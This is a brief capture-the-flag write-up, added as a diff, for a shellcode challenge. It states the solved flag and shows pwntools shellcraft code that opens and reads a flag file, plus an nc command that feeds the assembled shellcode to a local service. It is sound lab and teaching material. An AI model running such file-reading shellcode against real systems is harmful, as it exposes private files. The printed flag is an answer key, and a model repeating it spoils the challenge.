@@ -1,0 +1,16 @@
+Flag:
+Mak1ng_shelLcodE_i5_veRy_eaSy
+
+
+I used the python library `pwntools` to create a shellcode that opens the file, reads 45 bytes from it, and writes it back to the standard output. I used the following to generate the code:
+
+code = ''
+code += shellcraft.open(flag_path)
+code += shellcraft.mov('ebx', 'eax')
+code += shellcraft.read('ebx', 0x41414000, 45)
+code += shellcraft.write(1, 0x41414000, 45)
+code += shellcraft.exit(0)
+
+Then used `asm` to assemble it, and wrote the output to a temporary file. I redirected `nc` input to that file, so it reads and uses the shellcode:
+
+nc 0 9026 < /tmp/nadav1/shellcode
